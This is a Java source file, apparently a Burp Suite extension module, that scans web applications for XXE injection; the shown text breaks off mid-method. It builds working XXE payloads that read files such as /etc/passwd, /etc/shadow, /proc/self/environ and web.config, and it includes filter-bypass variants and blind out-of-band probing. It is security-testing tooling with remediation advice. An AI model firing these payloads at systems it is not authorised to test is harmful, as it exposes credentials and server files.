package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE: XXE (XML External Entity) Injection Scanner
 *
 * Comprehensive XXE detection covering:
 *   - Passive detection of XML content types, existing DTDs, and XML parser errors
 *   - Classic XXE file read (Linux & Windows targets via SYSTEM and PUBLIC entities)
 *   - Error-based XXE (malformed entities and non-existent file references)
 *   - XInclude injection for non-XML parameters embedded in server-side XML
 *   - Blind XXE via OOB using Burp Collaborator (parameter entities, direct entities, data exfiltration)
 *   - Content-Type conversion attacks (JSON-to-XML)
 *
 * False positive prevention:
 *   - File read payloads only reported when response contains known file content markers
 *   - OOB findings require confirmed Collaborator interaction (CERTAIN confidence)
 *   - Error-based findings require specific XML parser error strings not present in baseline
 *   - Deduplication by urlPath + paramName
 */
public class XxeScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;
    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();

    // ==================== CONSTANTS: XML CONTENT TYPES ====================

    private static final Set<String> XML_CONTENT_TYPES = Set.of(
            "application/xml",
            "text/xml",
            "application/soap+xml",
            "application/xhtml+xml",
            "application/rss+xml",
            "application/atom+xml",
            "application/xslt+xml",
            "application/mathml+xml",
            "application/rdf+xml",
            "image/svg+xml",
            "application/xop+xml",
            "application/wsdl+xml",
            "application/vnd.google-earth.kml+xml",
            "application/xliff+xml",
            "application/tei+xml",
            "application/xml-dtd",
            "application/xml-external-parsed-entity"
    );

    // ==================== CONSTANTS: FILE READ TARGETS ====================

    /**
     * Linux file targets — minimal high-confidence set.
     * Each entry: {filePath, evidencePattern, description}.
     * Only need a few files to prove XXE works. The attack technique diversity
     * (SYSTEM, PUBLIC, error-based, OOB, XInclude, CT-forcing) is what matters.
     */
    private static final String[][] LINUX_FILE_TARGETS = {
            {"/etc/passwd", "root:x:0:0:", "/etc/passwd"},
            {"/etc/hostname", "", "/etc/hostname"},
            {"/proc/self/environ", "PATH=", "/proc/self/environ"},
            {"/etc/shadow", "root:", "/etc/shadow"},
    };

    /**
     * Windows file targets — minimal high-confidence set.
     * Each entry: {filePath, evidencePattern, description}.
     * Only need a few files to prove XXE works.
     */
    private static final String[][] WINDOWS_FILE_TARGETS = {
            {"C:/Windows/win.ini", "[fonts]", "C:\\Windows\\win.ini"},
            {"C:/Windows/System32/drivers/etc/hosts", "localhost", "C:\\Windows\\System32\\drivers\\etc\\hosts"},
            {"C:/Windows/system.ini", "[drivers]", "C:\\Windows\\system.ini"},
            {"C:/inetpub/wwwroot/web.config", "configuration", "C:\\inetpub\\wwwroot\\web.config"},
    };

    // ==================== CONSTANTS: XML PARSER ERROR PATTERNS ====================

    private static final Pattern XML_PARSER_ERROR_PATTERN = Pattern.compile(
            "XML\\s*pars(?:ing|er)\\s*error"
                    + "|SAXParseException"
                    + "|SAXException"
                    + "|XMLSyntaxError"
                    + "|lxml\\.etree"
                    + "|simplexml_load_string"
                    + "|DOMDocument::load"
                    + "|xmlParseEntityRef"
                    + "|xmlParseCharRef"
                    + "|StartTag.*EndTag"
                    + "|Content is not allowed in prolog"
                    + "|The markup in the document following the root element must be well-formed"
                    + "|Premature end of data"
                    + "|not well-formed"
                    + "|org\\.xml\\.sax"
                    + "|javax\\.xml\\.parsers"
                    + "|System\\.Xml"
                    + "|REXML"
                    + "|Nokogiri"
                    + "|unterminated entity reference"
                    + "|Undeclared general entity"
                    + "|undefined entity"
                    + "|Invalid character reference"
                    + "|DOCTYPE.*not allowed"
                    + "|external entity"
                    + "|entity expansion"
                    + "|EntityRef"
                    + "|PCDATA invalid Char"
                    + "|xml\\.etree\\.ElementTree"
                    + "|xerces"
                    + "|XmlReader"
                    + "|XDocument"
                    + "|XElement"
                    + "|XPathException"
                    + "|TransformerException"
                    + "|DOMException"
                    + "|XMLReader"
                    + "|xml\\.dom\\.minidom"
                    + "|defusedxml"
                    + "|Error parsing XML"
                    + "|XML declaration allowed only at the start"
                    + "|xml\\.parsers\\.expat"
                    + "|ExpatError"
                    + "|XmlException"
                    + "|javax\\.xml\\.stream"
                    + "|javax\\.xml\\.transform"
                    + "|javax\\.xml\\.xpath"
                    + "|javax\\.xml\\.bind"
                    + "|javax\\.xml\\.validation"
                    + "|org\\.w3c\\.dom"
                    + "|org\\.jdom"
                    + "|org\\.dom4j"
                    + "|nu\\.xom"
                    + "|com\\.ctc\\.wstx"
                    + "|com\\.fasterxml\\.jackson\\.dataformat\\.xml"
                    + "|com\\.sun\\.org\\.apache\\.xerces"
                    + "|XmlPullParserException"
                    + "|XmlSyntaxException"
                    + "|XmlNodeSyntaxError"
                    + "|libxml2"
                    + "|XML::Parser"
                    + "|XML::LibXML"
                    + "|XML::Simple"
                    + "|XML::Twig"
                    + "|Msxml2\\.DOMDocument"
                    + "|MSXML"
                    + "|XslTransformException"
                    + "|System\\.Xml\\.Linq"
                    + "|System\\.Xml\\.XmlDocument"
                    + "|System\\.Xml\\.XPath"
                    + "|System\\.Xml\\.Xsl"
                    + "|System\\.Xml\\.Schema"
                    + "|XmlTextReader"
                    + "|XmlDocument\\.Load"
                    + "|XmlDocument\\.LoadXml"
                    + "|XmlSerializer"
                    + "|XmlConvert"
                    + "|xml\\.sax\\.handler"
                    + "|xml\\.sax\\.make_parser"
                    + "|xml\\.sax\\.parse"
                    + "|pulldom"
                    + "|minidom\\.parse"
                    + "|html5lib"
                    + "|xmltodict"
                    + "|cElementTree"
                    + "|ElementTree\\.parse"
                    + "|XMLStreamException"
                    + "|StAXResult"
                    + "|XMLInputFactory"
                    + "|XMLOutputFactory"
                    + "|DocumentBuilder"
                    + "|DocumentBuilderFactory"
                    + "|XMLEventReader"
                    + "|Unmarshaller"
                    + "|SchemaFactory"
                    + "|TransformerFactory"
                    + "|XPathExpression"
                    + "|XPathFactory"
                    + "|SAXReader"
                    + "|SAXBuilder",
            Pattern.CASE_INSENSITIVE
    );

    /** Patterns indicating DTD/entity processing in the parser (error-based confirmation). */
    private static final Pattern DTD_PROCESSING_ERROR_PATTERN = Pattern.compile(
            "DOCTYPE.*not allowed"
                    + "|external entity"
                    + "|entity expansion"
                    + "|undeclared.*entity"
                    + "|undefined entity"
                    + "|EntityRef"
                    + "|ENTITY.*not found"
                    + "|unable to load external entity"
                    + "|failed to load external entity"
                    + "|I/O error.*(?:file|http)"
                    + "|java\\.io\\.FileNotFoundException"
                    + "|java\\.net\\.(?:MalformedURL|Connect|UnknownHost)Exception"
                    + "|System\\.IO\\.FileNotFoundException"
                    + "|System\\.Net\\.WebException"
                    + "|No such file or directory"
                    + "|Access.*denied"
                    + "|Permission denied"
                    + "|Could not open"
                    + "|failed to open stream"
                    + "|entity.*?reference"
                    + "|DTD.*?not allowed"
                    + "|disallow.*?DOCTYPE"
                    + "|DOCTYPE.*?disallowed"
                    + "|Entities are not allowed"
                    + "|entity.*?expansion.*?limit"
                    + "|too many entity references"
                    + "|recursive entity reference"
                    + "|entity.*?recursion"
                    + "|maximum entity.*?depth"
                    + "|billion laughs"
                    + "|xml.*?bomb"
                    + "|entity.*?loop"
                    + "|entity.*?denied"
                    + "|entity.*?forbidden"
                    + "|entity.*?prohibited"
                    + "|DTD is prohibited"
                    + "|DTD processing.*?disabled"
                    + "|external.*?subset"
                    + "|parameter entity"
                    + "|general entity"
                    + "|parsed entity"
                    + "|unparsed entity"
                    + "|entity.*?not defined"
                    + "|entity.*?not declared"
                    + "|entity.*?not recognized"
                    + "|entity.*?resolution"
                    + "|entity.*?resolver"
                    + "|failed to resolve entity"
                    + "|cannot resolve entity"
                    + "|could not resolve entity"
                    + "|error resolving entity"
                    + "|entity.*?exceeds"
                    + "|entity.*?nesting"
                    + "|entity.*?depth.*?exceeded"
                    + "|entity.*?size.*?limit"
                    + "|entity.*?count.*?limit"
                    + "|maxOccurs.*?limit"
                    + "|FEATURE_SECURE_PROCESSING"
                    + "|DtdProcessing\\.Prohibit"
                    + "|libxml_disable_entity_loader"
                    + "|LIBXML_NOENT"
                    + "|XmlResolver"
                    + "|XmlUrlResolver"
                    + "|setFeature.*?external"
                    + "|disallow-doctype-decl"
                    + "|external-general-entities"
                    + "|external-parameter-entities"
                    + "|XMLConstants\\.ACCESS_EXTERNAL_DTD"
                    + "|XMLConstants\\.ACCESS_EXTERNAL_SCHEMA"
                    + "|XMLConstants\\.ACCESS_EXTERNAL_STYLESHEET",
            Pattern.CASE_INSENSITIVE
    );

    // ==================== CONSTANTS: FILE CONTENT EVIDENCE PATTERNS ====================

    /** Patterns that confirm actual file content was returned (for false positive prevention). */
    private static final Pattern LINUX_PASSWD_EVIDENCE = Pattern.compile("root:[x*]:0:0:");
    private static final Pattern WINDOWS_WIN_INI_EVIDENCE = Pattern.compile("\\[fonts\\]", Pattern.CASE_INSENSITIVE);
    private static final Pattern WINDOWS_HOSTS_EVIDENCE = Pattern.compile("127\\.0\\.0\\.1\\s+localhost", Pattern.CASE_INSENSITIVE);

    // ==================== OVERRIDES ====================

    @Override
    public String getId() { return "xxe-scanner"; }

    @Override
    public String getName() { return "XXE Scanner"; }

    @Override
    public String getDescription() {
        return "XML External Entity injection detection via classic file read, error-based, XInclude, "
                + "blind OOB (Collaborator), and Content-Type conversion attacks.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    // ==================== MAIN ENTRY POINT ====================

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String url = request.url();
        String urlPath = extractPath(url);

        // For targeted parameter scan, only run XInclude injection on the selected parameter
        if (config.getBool("xxe.xinclude.enabled", true)) {
            List<XxeTarget> paramTargets = extractParameterTargets(request);
            paramTargets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
            for (XxeTarget target : paramTargets) {
                if (!dedup.markIfNew("xxe-xinclude", urlPath, target.name)) continue;
                try {
                    testXInclude(requestResponse, target, url);
                } catch (Exception e) {
                    api.logging().logToError("XXE XInclude test error on " + target.name + ": " + e.getMessage());
                }
            }
        }

        return Collections.emptyList();
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        HttpResponse response = requestResponse.response();
        String url = request.url();
        String urlPath = extractPath(url);
        String contentType = getContentType(request);

        // -------- PASSIVE ANALYSIS --------
        passiveAnalysis(requestResponse, url, contentType);

        // -------- ACTIVE TESTING --------
        boolean isXmlRequest = isXmlContentType(contentType);
        boolean isJsonRequest = contentType != null && contentType.contains("application/json");

        // Fingerprint the target to tailor payloads (OS + runtime detection)
        TargetFingerprint fingerprint = fingerprint(requestResponse);
        if (fingerprint.os != DetectedOS.UNKNOWN || fingerprint.runtime != DetectedRuntime.UNKNOWN) {
            api.logging().logToOutput("[XXE] Fingerprint: OS=" + fingerprint.os
                    + " Runtime=" + fingerprint.runtime + " for " + url);
        }

        // Phase 1: If the request body is already XML, test the XML body directly
        if (isXmlRequest) {
            if (dedup.markIfNew("xxe-scanner", urlPath, "__xml_body__")) {
                try {
                    testXmlBody(requestResponse, url, fingerprint);
                } catch (Exception e) {
                    api.logging().logToError("XXE XML body test error: " + e.getMessage());
                }
            }
        }

        // Phase 2: XInclude injection in individual parameters
        if (oobConfirmedParams.contains("xml_body")) return Collections.emptyList();
        if (config.getBool("xxe.xinclude.enabled", true)) {
            List<XxeTarget> paramTargets = extractParameterTargets(request);
            for (XxeTarget target : paramTargets) {
                if (!dedup.markIfNew("xxe-xinclude", urlPath, target.name)) continue;
                try {
                    testXInclude(requestResponse, target, url);
                } catch (Exception e) {
                    api.logging().logToError("XXE XInclude test error on " + target.name + ": " + e.getMessage());
                }
            }
        }

        // Phase 3: Content-Type conversion (JSON -> XML)
        if (oobConfirmedParams.contains("xml_body")) return Collections.emptyList();
        if (config.getBool("xxe.contentTypeConversion.enabled", true) && isJsonRequest) {
            if (dedup.markIfNew("xxe-convert", urlPath, "__json_to_xml__")) {
                try {
                    testContentTypeConversion(requestResponse, url);
                } catch (Exception e) {
                    api.logging().logToError("XXE Content-Type conversion test error: " + e.getMessage());
                }
            }
        }

        // Phase 4: Content-Type forcing — for non-XML, non-JSON requests that have a body
        // (e.g., application/x-www-form-urlencoded, multipart/form-data).
        // Many frameworks (Rails, Spring, JAX-RS, Express) auto-detect Content-Type and will
        // parse XML if you simply switch the Content-Type header. Send a minimal XXE probe
        // as XML to check if the server processes it.
        if (oobConfirmedParams.contains("xml_body")) return Collections.emptyList();
        if (config.getBool("xxe.contentTypeForcing.enabled", true) && !isXmlRequest && !isJsonRequest) {
            String body = null;
            try { body = request.bodyToString(); } catch (Exception ignored) {}
            if (body != null && !body.trim().isEmpty()) {
                if (dedup.markIfNew("xxe-force-ct", urlPath, "__force_xml__")) {
                    try {
                        testContentTypeForcing(requestResponse, url, fingerprint);
                    } catch (Exception e) {
                        api.logging().logToError("XXE Content-Type forcing test error: " + e.getMessage());
                    }
                }
            }
        }

        return Collections.emptyList();
    }

    // ==================== PASSIVE ANALYSIS ====================

    /**
     * Passive detection: identifies XML content types, existing DTDs in request bodies,
     * and XML parsing errors in responses.
     */
    private void passiveAnalysis(HttpRequestResponse requestResponse, String url, String contentType) {
        HttpRequest request = requestResponse.request();
        HttpResponse response = requestResponse.response();

        // Detect XML content type in the request
        if (isXmlContentType(contentType)) {
            findingsStore.addFinding(Finding.builder("xxe-scanner",
                            "XML Content-Type detected in request",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url).parameter("Content-Type")
                    .evidence("Content-Type: " + contentType)
                    .description("The request uses an XML content type (" + contentType + "). "
                            + "This endpoint accepts XML input and may be susceptible to XXE injection "
                            + "if the XML parser is not configured to disable external entity processing.")
                    .requestResponse(requestResponse)
                    .build());
        }

        // Detect existing DTD declarations in the request body
        String body = null;
        try {
            body = request.bodyToString();
        } catch (Exception ignored) {}

        if (body != null && !body.isEmpty()) {
            if (body.contains("<!DOCTYPE") || body.contains("<!ENTITY")) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "DTD declaration found in request body",
                                Severity.LOW, Confidence.CERTAIN)
                        .url(url).parameter("request_body")
                        .evidence("Request body contains DTD declaration (<!DOCTYPE or <!ENTITY)")
                        .description("The request body contains a Document Type Definition. "
                                + "This suggests the application processes XML with DTDs, which may allow "
                                + "XXE attacks if external entity processing is not disabled.")
                        .requestResponse(requestResponse)
                        .build());
            }
        }

        // Detect XML parsing errors in the response
        if (response != null) {
            String responseBody = null;
            try {
                responseBody = response.bodyToString();
            } catch (Exception ignored) {}

            if (responseBody != null && XML_PARSER_ERROR_PATTERN.matcher(responseBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XML parser error detected in response",
                                Severity.LOW, Confidence.FIRM)
                        .url(url)
                        .evidence("Response contains XML parser error message")
                        .description("The response contains an XML parser error message, revealing that "
                                + "the server uses an XML parser. This endpoint may be vulnerable to XXE "
                                + "if the parser allows external entity processing.")
                        .requestResponse(requestResponse)
                        .build());
            }
        }

        // Detect SAML XML context (high-value XXE target)
        boolean hasSamlParam = false;
        for (var param : request.parameters()) {
            if ("SAMLRequest".equalsIgnoreCase(param.name())
                    || "SAMLResponse".equalsIgnoreCase(param.name())) {
                hasSamlParam = true;
                break;
            }
        }
        if (hasSamlParam
                || (body != null && body.contains("urn:oasis:names:tc:SAML"))
                || (body != null && (body.contains("samlp:") || body.contains("saml2p:")))) {
            findingsStore.addFinding(Finding.builder("xxe-scanner",
                            "SAML XML context detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url).parameter(hasSamlParam ? "SAMLRequest/SAMLResponse" : "request_body")
                    .evidence("SAML protocol detected — XML-based authentication flow")
                    .description("This endpoint handles SAML XML messages. SAML processors are a common "
                            + "target for XXE injection because they must parse untrusted XML. "
                            + "If the SAML library does not disable external entity processing, "
                            + "XXE attacks can extract sensitive data or perform SSRF. "
                            + "Test this endpoint with both classic and OOB XXE payloads.")
                    .requestResponse(requestResponse)
                    .build());
        }
    }

    // ==================== PHASE 1: XML BODY TESTING ====================

    /**
     * Tests XXE injection when the request already has an XML content type.
     * Applies classic file read, error-based, and blind OOB payloads to the XML body.
     */
    private void testXmlBody(HttpRequestResponse original, String url,
                              TargetFingerprint fingerprint) throws InterruptedException {
        String requestBody = original.request().bodyToString();
        if (requestBody == null || requestBody.trim().isEmpty()) return;

        // Get baseline response for comparison
        HttpRequestResponse baseline = sendRawRequest(original, requestBody);
        String baselineBody = (baseline != null && baseline.response() != null)
                ? baseline.response().bodyToString() : "";

        // Determine XML context
        boolean isSoap = requestBody.contains("<soap:") || requestBody.contains("<SOAP-ENV:")
                || requestBody.contains("soap:Envelope") || requestBody.contains("soapenv:");

        // Detect if endpoint is blind (doesn't reflect XML content).
        // Blind endpoints can't yield classic file-read results — those would be
        // false positives from incidental response differences. Prioritize OOB instead.
        boolean blind = isBlindEndpoint(original, requestBody);
        if (blind) {
            api.logging().logToOutput("[XXE] Endpoint appears blind — prioritizing OOB, skipping classic file read.");
        }

        if (blind) {
            // Blind endpoint: error-based first (cheap, reveals parser), then OOB (primary)
            if (config.getBool("xxe.classic.enabled", true)) {
                testErrorBasedXxe(original, url, requestBody, baselineBody);
            }
            if (config.getBool("xxe.oob.enabled", true)
                    && collaboratorManager != null && collaboratorManager.isAvailable()) {
                testBlindXxeOob(original, url, requestBody);
            }
        } else {
            // Reflective endpoint: classic file read is viable (fingerprint-aware)
            if (config.getBool("xxe.classic.enabled", true)) {
                testClassicXxeFileRead(original, url, requestBody, baselineBody, isSoap, fingerprint);
            }
            if (config.getBool("xxe.classic.enabled", true)) {
                testErrorBasedXxe(original, url, requestBody, baselineBody);
            }
            if (config.getBool("xxe.oob.enabled", true)
                    && collaboratorManager != null && collaboratorManager.isAvailable()) {
                testBlindXxeOob(original, url, requestBody);
            }
        }

        // Bypass phases: UTF-16 encoding and double-encoded entities
        // These run regardless of blind/reflective since they test filter evasion
        if (config.getBool("xxe.bypass.enabled", true)) {
            testUtf16Bypass(original, url, baselineBody, fingerprint);
            testDoubleEncodedBypass(original, url, requestBody, baselineBody, fingerprint);
        }
    }

    // ==================== PHASE 1a: CLASSIC XXE FILE READ ====================

    /**
     * Attempts to read well-known files on Linux and Windows via XML external entities.
     * Uses SYSTEM and PUBLIC DTD syntaxes, and tests both standalone XML and SOAP bodies.
     */
    private void testClassicXxeFileRead(HttpRequestResponse original, String url,
                                         String requestBody, String baselineBody,
                                         boolean isSoap,
                                         TargetFingerprint fingerprint) throws InterruptedException {
        // Fingerprint-aware target selection:
        //   Known OS   → full file list for that OS only (skip the irrelevant OS entirely)
        //   Unknown OS → minimal high-confidence subset from both (3 files each)
        // This dramatically reduces requests and eliminates cross-OS false positives.
        String[][] linuxTargets = getLinuxTargets(fingerprint);
        String[][] windowsTargets = getWindowsTargets(fingerprint);

        api.logging().logToOutput("[XXE] File read targets: " + linuxTargets.length
                + " Linux + " + windowsTargets.length + " Windows (OS=" + fingerprint.os + ")");

        for (String[] target : linuxTargets) {
            testFileReadPayloads(original, url, requestBody, baselineBody, isSoap,
                    target[0], target[1], target[2], "Linux");
        }

        for (String[] target : windowsTargets) {
            testFileReadPayloads(original, url, requestBody, baselineBody, isSoap,
                    target[0], target[1], target[2], "Windows");
        }
    }

    /**
     * Generates and sends multiple DTD-based file read payloads for a given target file.
     * Tests SYSTEM entity, PUBLIC entity, and SOAP-wrapped variants.
     */
    private void testFileReadPayloads(HttpRequestResponse original, String url,
                                       String requestBody, String baselineBody,
                                       boolean isSoap, String filePath,
                                       String evidencePattern, String fileDescription,
                                       String osType) throws InterruptedException {

        String entityName = "xxetest";

        // Payload variant 1: SYSTEM entity - prepend DTD to existing body
        String systemDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY " + entityName + " SYSTEM \"file://" + filePath + "\">\n"
                + "]>\n";
        String systemPayloadBody = injectDtdIntoXml(requestBody, systemDtd, "&" + entityName + ";");
        testSingleFileReadPayload(original, url, systemPayloadBody, baselineBody,
                evidencePattern, fileDescription, osType, "SYSTEM entity", filePath);

        perHostDelay();

        // Payload variant 2: PUBLIC entity - prepend DTD to existing body
        String publicDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY " + entityName + " PUBLIC \"any\" \"file://" + filePath + "\">\n"
                + "]>\n";
        String publicPayloadBody = injectDtdIntoXml(requestBody, publicDtd, "&" + entityName + ";");
        testSingleFileReadPayload(original, url, publicPayloadBody, baselineBody,
                evidencePattern, fileDescription, osType, "PUBLIC entity", filePath);

        perHostDelay();

        // Payload variant 3: Standalone XML body (in case the original body is not well-formed)
        String standaloneXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<!DOCTYPE foo [\n"
                + "  <!ENTITY " + entityName + " SYSTEM \"file://" + filePath + "\">\n"
                + "]>\n"
                + "<foo>&" + entityName + ";</foo>";
        testSingleFileReadPayload(original, url, standaloneXml, baselineBody,
                evidencePattern, fileDescription, osType, "Standalone XML SYSTEM", filePath);

        perHostDelay();

        // Payload variant 4: SOAP-specific payload (if original request is SOAP)
        if (isSoap) {
            String soapXxeBody = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY " + entityName + " SYSTEM \"file://" + filePath + "\">\n"
                    + "]>\n"
                    + injectEntityReferenceIntoSoap(requestBody, "&" + entityName + ";");
            testSingleFileReadPayload(original, url, soapXxeBody, baselineBody,
                    evidencePattern, fileDescription, osType, "SOAP SYSTEM entity", filePath);

            perHostDelay();
        }
    }

    /**
     * Sends a single file-read XXE payload and checks the response for evidence of file content.
     */
    private void testSingleFileReadPayload(HttpRequestResponse original, String url,
                                            String payloadBody, String baselineBody,
                                            String evidencePattern, String fileDescription,
                                            String osType, String technique,
                                            String filePath) {
        HttpRequestResponse result = sendRawRequest(original, payloadBody);
        if (result == null || result.response() == null) return;

        String responseBody = result.response().bodyToString();
        if (responseBody == null) return;

        // Only report if we find evidence of actual file content not present in baseline
        boolean confirmed = false;
        String matchedEvidence = "";

        if (!evidencePattern.isEmpty()) {
            // Use the specific evidence pattern — but guard against empty baseline
            boolean baselineEmpty = baselineBody == null || baselineBody.isEmpty();
            if (responseBody.contains(evidencePattern)
                    && (baselineEmpty ? result.response().statusCode() == 200 : !baselineBody.contains(evidencePattern))) {
                confirmed = true;
                matchedEvidence = evidencePattern;
            }
        } else {
            // For files without a fixed evidence pattern (e.g., /etc/hostname),
            // check if the response changed significantly and contains plausible output.
            // Require non-empty baseline to avoid FPs when baseline request failed.
            if (baselineBody != null && !baselineBody.isEmpty()
                    && !responseBody.equals(baselineBody)
                    && responseBody.length() != baselineBody.length()
                    && result.response().statusCode() == 200) {
                // /etc/hostname typically returns a short hostname string.
                // We additionally verify the response differs from baseline by content.
                String diff = findNewContent(baselineBody, responseBody);
                if (diff != null && diff.length() > 0 && diff.length() < 256
                        && !XML_PARSER_ERROR_PATTERN.matcher(diff).find()) {
                    confirmed = true;
                    matchedEvidence = "New content in response: " + diff.substring(0, Math.min(100, diff.length()));
                }
            }
        }

        // Secondary confirmation: check for the well-known Linux passwd file pattern
        if (!confirmed && filePath.equals("/etc/passwd")) {
            if (LINUX_PASSWD_EVIDENCE.matcher(responseBody).find()
                    && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                confirmed = true;
                matchedEvidence = "root:x:0:0: pattern found";
            }
        }

        // Secondary confirmation: check for Windows win.ini pattern
        if (!confirmed && filePath.contains("win.ini")) {
            if (WINDOWS_WIN_INI_EVIDENCE.matcher(responseBody).find()
                    && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
                confirmed = true;
                matchedEvidence = "[fonts] section found";
            }
        }

        // Secondary confirmation: check for Windows hosts file pattern
        if (!confirmed && filePath.contains("hosts")) {
            if (WINDOWS_HOSTS_EVIDENCE.matcher(responseBody).find()
                    && !WINDOWS_HOSTS_EVIDENCE.matcher(baselineBody).find()) {
                confirmed = true;
                matchedEvidence = "localhost entry found";
            }
        }

        if (confirmed) {
            findingsStore.addFinding(Finding.builder("xxe-scanner",
                            "XXE File Read: " + fileDescription + " (" + osType + ")",
                            Severity.CRITICAL, Confidence.CERTAIN)
                    .url(url).parameter("xml_body")
                    .evidence("Technique: " + technique + " | File: " + filePath
                            + " | Evidence: " + matchedEvidence)
                    .description("XML External Entity injection confirmed. The XML parser resolved "
                            + "an external SYSTEM entity pointing to " + fileDescription + " and "
                            + "returned the file content in the response. "
                            + "Technique used: " + technique + ". "
                            + "Remediation: Disable external entity processing in the XML parser. "
                            + "For Java: set XMLConstants.FEATURE_SECURE_PROCESSING, disable DTDs. "
                            + "For .NET: use XmlReaderSettings with DtdProcessing.Prohibit. "
                            + "For PHP: use libxml_disable_entity_loader(true).")
                    .payload(payloadBody)
                    .responseEvidence(matchedEvidence)
                    .requestResponse(result)
                    .build());
            api.logging().logToOutput("[XXE] File read confirmed: " + fileDescription
                    + " at " + url + " via " + technique);
        }
    }

    // ==================== PHASE 1b: ERROR-BASED XXE ====================

    /**
     * Tests error-based XXE: references non-existent files and uses malformed entities
     * to trigger parser errors that reveal the XML parser processes external entities.
     */
    private void testErrorBasedXxe(HttpRequestResponse original, String url,
                                    String requestBody, String baselineBody) throws InterruptedException {

        // Error payload 1: Reference a non-existent file to trigger a file-not-found error
        String nonExistentFileDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY xxe SYSTEM \"file:///nonexistent/xxe_probe_" + System.currentTimeMillis() + "\">\n"
                + "]>\n";
        String nonExistentPayload = injectDtdIntoXml(requestBody, nonExistentFileDtd, "&xxe;");
        HttpRequestResponse nonExistentResult = sendRawRequest(original, nonExistentPayload);

        if (nonExistentResult != null && nonExistentResult.response() != null) {
            String responseBody = nonExistentResult.response().bodyToString();
            if (responseBody != null
                    && DTD_PROCESSING_ERROR_PATTERN.matcher(responseBody).find()
                    && !DTD_PROCESSING_ERROR_PATTERN.matcher(baselineBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE Error-Based: XML parser processes external entities",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter("xml_body")
                        .evidence("Non-existent file entity triggered parser error confirming entity processing")
                        .description("The XML parser attempted to resolve an external SYSTEM entity "
                                + "pointing to a non-existent file, producing an error that confirms "
                                + "external entity processing is enabled. This is a strong indicator "
                                + "of XXE vulnerability even though no file was read. "
                                + "Remediation: Disable DTD processing and external entity resolution.")
                        .payload(nonExistentPayload)
                        .requestResponse(nonExistentResult)
                        .build());
            }
        }

        perHostDelay();

        // Error payload 2: Malformed entity definition to detect XML parser
        String malformedDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY % xxe SYSTEM \"file:///\">\n"
                + "  %xxe;\n"
                + "]>\n";
        String malformedPayload = injectDtdIntoXml(requestBody, malformedDtd, "");
        HttpRequestResponse malformedResult = sendRawRequest(original, malformedPayload);

        if (malformedResult != null && malformedResult.response() != null) {
            String responseBody = malformedResult.response().bodyToString();
            if (responseBody != null
                    && DTD_PROCESSING_ERROR_PATTERN.matcher(responseBody).find()
                    && !DTD_PROCESSING_ERROR_PATTERN.matcher(baselineBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE Error-Based: Parameter entity processing confirmed",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter("xml_body")
                        .evidence("Malformed parameter entity triggered parser error confirming DTD processing")
                        .description("The XML parser processed a parameter entity definition within the DTD, "
                                + "confirming that DTD processing and external entity resolution are enabled. "
                                + "Remediation: Disable DTD processing entirely.")
                        .payload(malformedPayload)
                        .requestResponse(malformedResult)
                        .build());
            }
        }

        perHostDelay();

        // Error payload 3: Recursive entity expansion to detect parser limits
        String recursiveEntityDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY xxe \"XXE_PROBE_CONFIRMED\">\n"
                + "]>\n";
        String recursivePayload = injectDtdIntoXml(requestBody, recursiveEntityDtd, "&xxe;");
        HttpRequestResponse recursiveResult = sendRawRequest(original, recursivePayload);

        if (recursiveResult != null && recursiveResult.response() != null) {
            String responseBody = recursiveResult.response().bodyToString();
            if (responseBody != null
                    && responseBody.contains("XXE_PROBE_CONFIRMED")
                    && !baselineBody.contains("XXE_PROBE_CONFIRMED")) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE Confirmed: Internal entity expansion works",
                                Severity.HIGH, Confidence.CERTAIN)
                        .url(url).parameter("xml_body")
                        .evidence("Internal entity &xxe; expanded to 'XXE_PROBE_CONFIRMED' in response")
